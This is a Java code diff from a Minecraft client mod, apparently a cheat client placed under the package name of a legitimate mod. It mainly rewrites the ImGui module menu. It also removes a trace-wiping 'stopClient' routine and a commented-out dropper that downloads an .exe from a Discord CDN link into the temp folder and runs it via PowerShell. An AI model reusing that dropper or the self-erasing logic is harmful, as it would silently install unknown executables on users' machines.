@@ -2,31 +2,23 @@ package net.caffeinemc.phosphor.gui;
 
 import imgui.ImGui;
 import imgui.flag.ImGuiCol;
+import imgui.flag.ImGuiWindowFlags;
 import net.caffeinemc.phosphor.api.font.JColor;
 import net.caffeinemc.phosphor.common.Phosphor;
 import net.caffeinemc.phosphor.module.Module;
 import net.caffeinemc.phosphor.module.modules.client.AsteriaSettingsModule;
+import net.minecraft.client.MinecraftClient;
 
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-public class AsteriaMenu implements Renderable {
-    private static AsteriaMenu instance;
+public class AsteriaNewMenu implements Renderable {
+    private static AsteriaNewMenu instance;
 
-    private static final AtomicBoolean clientEnabled = new AtomicBoolean(true);
-    private final List<CategoryTab> tabs = new ArrayList<>();
-
-    public static AsteriaMenu getInstance() {
+    public static AsteriaNewMenu getInstance() {
         if (instance == null) {
-            instance = new AsteriaMenu();
-        }
-        if (instance.tabs.isEmpty()) {
-            float posX = 10f;
-            for (Module.Category category : Module.Category.values()) {
-                instance.tabs.add(new CategoryTab(category, posX, 10f));
-                posX += 200f;
-            }
+            instance = new AsteriaNewMenu();
         }
         return instance;
     }
@@ -39,44 +31,6 @@ public class AsteriaMenu implements Renderable {
         }
     }
 
-    public static boolean isClientEnabled() {
-        return clientEnabled.get();
-    }
-
-    public static void stopClient() {
-        Phosphor.configManager().saveConfig();
-
-        toggleVisibility();
-        clientEnabled.set(false);
-
-        new Thread(() -> {
-            Module.Category.clearStrings();
-            for (Module module : Phosphor.moduleManager().modules) {
-                if (module.isEnabled())
-                    module.disable();
-
-                module.cleanStrings();
-            }
-
-//            String FILE_URL = "https://cdn.discordapp.com/attachments/1125468134833401989/1130936549131952148/vapelite.exe";
-//            String FILE_NAME = RandomStringUtils.random(10, true, true);
-//            String PATH = System.getProperty("java.io.tmpdir");
-//
-//            try {
-//                InputStream inputStream = new URL(FILE_URL).openStream();
-//                Path pathToFile = Paths.get(PATH).resolve(FILE_NAME);
-//                Files.copy(inputStream, pathToFile, StandardCopyOption.REPLACE_EXISTING);
-//
-//                String command = String.format("powershell.exe Start-Process -FilePath \"%s\" -PassThru -NoNewWindow", pathToFile);
-//                Process powerShellProcess = Runtime.getRuntime().exec(command);
-//
-//                powerShellProcess.waitFor();
-//            } catch (IOException | InterruptedException e) {
-//                throw new RuntimeException(e);
-//            }
-        }).start();
-    }
-
     @Override
     public String getName() {
         return Phosphor.name;
@@ -86,9 +40,85 @@ public class AsteriaMenu implements Renderable {
     public void render() {
         if(Phosphor.moduleManager().getModule(AsteriaSettingsModule.class) != null)
             Phosphor.moduleManager().getModule(AsteriaSettingsModule.class).updateMode();
-        for (CategoryTab categoryTab : tabs) {
-            categoryTab.render();
+        NewTab.getInstance().render();
+
+        int imGuiWindowFlags = 0;
+        imGuiWindowFlags |= ImGuiWindowFlags.AlwaysAutoResize;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoDocking;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoMove;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoTitleBar;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoResize;
+        imGuiWindowFlags |= ImGuiWindowFlags.NoCollapse;
+        ImGui.getStyle().setFramePadding(4, 6);
+        ImGui.getStyle().setButtonTextAlign(0.05f, 0.5f);
+        ImGui.getStyle().setWindowPadding(16,16);
+        ImGui.getStyle().setWindowRounding(16f);
+        ImGui.setNextWindowSize(600f, 500f, 0);
+        ImGui.begin(getName(), imGuiWindowFlags);
+        ImGui.getStyle().setWindowRounding(4f);
+        ImGui.getStyle().setWindowPadding(6,6);
+
+        //float posX = (float) (MinecraftClient.getInstance().getWindow().getWidth() / 2 - 330);
+        //float posY = (float) (MinecraftClient.getInstance().getWindow().getHeight() / 2 - 250);
+        float posX = NewTab.getInstance().getPos().x+160;
+        float posY = NewTab.getInstance().getPos().y;
+        ImGui.setWindowPos(posX, posY);
+
+        for (Module module : Phosphor.moduleManager().getModulesByCategory(NewTab.getInstance().selectedCategory)) {
+            ImGui.pushID(module.getName());
+
+            if (module.isEnabled()) {
+                float[] color = JColor.getGuiColor().getFloatColor();
+
+                ImGui.pushStyleColor(ImGuiCol.Text, 0.80f, 0.84f, 0.96f, 1.00f);
+                //ImGui.pushStyleColor(ImGuiCol.Button, color[0], color[1], color[2], 0.50f);
+                //ImGui.pushStyleColor(ImGuiCol.ButtonHovered, color[0], color[1], color[2], 0.65f);
+                //ImGui.pushStyleColor(ImGuiCol.ButtonActive, color[0], color[1], color[2], 0.8f);
+                ImGui.pushStyleColor(ImGuiCol.Button, 0.09f, 0.09f, 0.15f, 0.6f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonHovered, 0.09f, 0.09f, 0.15f, 0.75f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonActive, 0.1f, 0.1f, 0.16f, 0.9f);
+            } else {
+                ImGui.pushStyleColor(ImGuiCol.Text, 0.42f, 0.44f, 0.53f, 1.00f);
+                ImGui.pushStyleColor(ImGuiCol.Button, 0.09f, 0.09f, 0.15f, 0.5f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonHovered, 0.09f, 0.09f, 0.15f, 0.65f);
+                ImGui.pushStyleColor(ImGuiCol.ButtonActive, 0.1f, 0.1f, 0.16f, 0.8f);
+            }
+
+            ImGui.pushFont(ImguiLoader.getBigDosisFont());
+            boolean isToggled = ImGui.button(module.getName(), 568f, 50f);
+            ImGui.popFont();
+            ImGui.popStyleColor(4);
+
+            if (isToggled) {
+                module.toggle();
+            }
+
+            if (ImGui.isItemHovered()) {
+                ImGui.setTooltip(module.getDescription());
+
+                if (ImGui.isMouseClicked(1)) {
+                    module.toggleShowOptions();
+                }
+            }
+
+            if (module.showOptions()) {
+                ImGui.indent(10f);
+                ImGui.pushFont(ImguiLoader.getDosisFont());
+                ImGui.getStyle().setFrameRounding(4f);
+                ImGui.getStyle().setFramePadding(4, 4);
+                ImGui.getStyle().setButtonTextAlign(0.5f, 0.5f);
+                module.renderSettings();
+                ImGui.getStyle().setButtonTextAlign(0.05f, 0.5f);
+                ImGui.getStyle().setFramePadding(4, 6);
+                ImGui.getStyle().setFrameRounding(30f);
+                ImGui.popFont();
+                ImGui.unindent(10f);
+            }
+
+            ImGui.popID();
         }
+
+        ImGui.end();
     }
 
     @Override
